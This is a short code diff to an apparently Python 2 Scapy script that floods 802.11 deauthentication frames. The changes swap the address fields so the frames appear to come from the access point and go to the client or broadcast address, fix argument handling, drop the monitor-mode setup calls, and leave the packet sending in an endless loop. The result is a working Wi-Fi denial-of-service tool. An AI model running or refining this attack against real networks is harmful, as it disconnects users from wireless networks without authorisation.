@@ -28,17 +28,14 @@ bssid = options.bssid
 
 if t_type == None:
     t_type = 0
-elif c_mac == None:
-    c_mac = "ff:ff:ff:ff:ff:ff"
+if c_mac == None:
+    c_mac = "ff:ff:ff:ff:ff:ff".upper()
+print c_mac
 
-os.system("ifconfig "+iface+" down")
-os.system("iwconfig "+iface+" mode monitor")
-os.system("ifconfig "+iface+" up")
 
 pkt = RadioTap()/\
-Dot11(subtype=0x00c,addr1=bssid,addr2=c_mac,addr3=c_mac)/\
-Dot11Deauth(reason=t_type)
+Dot11(subtype=0x00c,addr1=c_mac,addr2=bssid,addr3=bssid)/\
+Dot11Deauth(reason=int(t_type))
 
 while True:
-    for i in range(0,50):
-        sendp(pkt,iface=iface)
+    sendp(pkt,iface=iface)
